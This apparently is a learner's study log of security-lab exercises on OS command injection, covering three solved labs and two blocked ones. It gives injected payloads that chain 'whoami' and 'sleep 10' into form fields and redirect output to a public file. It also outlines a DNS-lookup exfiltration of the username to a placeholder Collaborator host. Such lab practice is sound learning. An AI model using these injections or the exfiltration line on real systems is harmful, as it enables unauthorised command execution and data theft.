# Day 33: OS Command Injection, Three Solved and Two Blocked by Collaborator

- Lab: OS command injection, simple case, solved (Apprentice)
- Lab: Blind OS command injection with time delays, solved (Practitioner)
- Lab: Blind OS command injection with output redirection, solved (Practitioner)
- Lab: Blind OS command injection with out-of-band interaction, not solved, requires Burp Collaborator (Practitioner)
- Lab: Blind OS command injection with out-of-band data exfiltration, not solved, requires Burp Collaborator (Practitioner)

Roadmap: A05 Injection, command injection section complete, 3 of 5 labs solved, 2 blocked by the same Burp Professional limitation as earlier SQLi and XSS labs.

## What I learned

### OS command injection, simple case

Found via Burp Proxy intercepting the "check stock" request, sent to Repeater.

Payload, decoded:

```
productId=1&storeId=1 & whoami
```

How it works:

- The server runs a shell command using the submitted productId and storeId directly, with no sanitising
- `&` is a shell operator that lets a second, completely separate command run right after the first, on the same line
- The application captures and returns whatever text the shell command produces, so whoami's output, the current OS user, appears directly in the response alongside the original stock report output
- One sentence: the server builds a shell command out of user input, so appending & whoami runs a second command of my choosing and its output comes back in the response

### Blind OS command injection with time delays

Found via the feedback form, sent to Repeater.

Payload, decoded:

```
email=hlo@gmail.com& sleep 10 #
```

How it works:

- This command's output is never shown anywhere in the response, so there is nothing to read directly. The only way to prove the injection works is to make the server visibly behave differently when it runs
- `&` chains sleep 10 as a second command, same chaining trick as lab 1
- sleep 10 pauses execution for ten seconds and produces no output at all, which is exactly why it is useful here: a ten second delay in the response is unmistakable evidence the command ran, even with zero visible output
- `#` is a shell comment character. Anything the server normally appends after the submitted value, like a closing quote, gets treated as a comment and ignored instead of breaking the command
- One sentence: since there is no output to read, make the server pause instead, a measurable delay proves the injected command executed

### Blind OS command injection with output redirection

Confirmed the injection point first using the same sleep 10 trick as lab 2, then moved to retrieving real output.

Payload, decoded:

```
email=hlo@gmail.com& whoami > output.txt #
```

How it works:

- Still no output shown directly in the response, same as lab 2, so sleep confirmed the vulnerability exists before trying to extract anything
- `>` is shell output redirection. Instead of letting whoami's output disappear, it gets written into a file, here named output.txt, inside the one folder the lab stated is both writable and served publicly for product images
- Once the file exists on disk, it can be read back through the completely unrelated, already-existing image-loading endpoint, by requesting that filename instead of a real product image
- One sentence: redirect the blind command's output into a file sitting inside a folder the application already serves to the public, then simply request that file to read the result

## Blocked labs

Both remaining labs in this section need Burp Collaborator to detect an out-of-band DNS interaction, since the injected command runs asynchronously with no effect on the response and no accessible location to redirect output into. Collaborator is a Burp Suite Professional feature, not available in Community Edition, same limitation as the two blocked SQLi labs and the Capture Passwords XSS lab. The concept, for reference: the injected command would run something like `nslookup $(whoami).BURP-COLLABORATOR-ID` so the current username gets encoded directly into a DNS lookup that only Collaborator's server receives, letting the result be read from Collaborator's interaction log without needing any visible output or writable folder at all.

## Key takeaways

- Shell chaining operators are the core trick of this entire section: & and ; both run a second, independent command after the first, && only runs the second if the first succeeds, and || only runs it if the first fails
- A blind vulnerability with no visible output and no writable, readable location still has two ways to prove it exists: a time delay like sleep 10, or an out-of-band channel like a DNS lookup to Collaborator
- Output redirection with > turns a blind injection into a readable one, as long as there is a folder the application both lets you write to and lets you read back from over HTTP
- As a shell comment character serves the same purpose here that it does in SQL injection, swallowing whatever trailing syntax the application would otherwise append, so the injected command stays valid
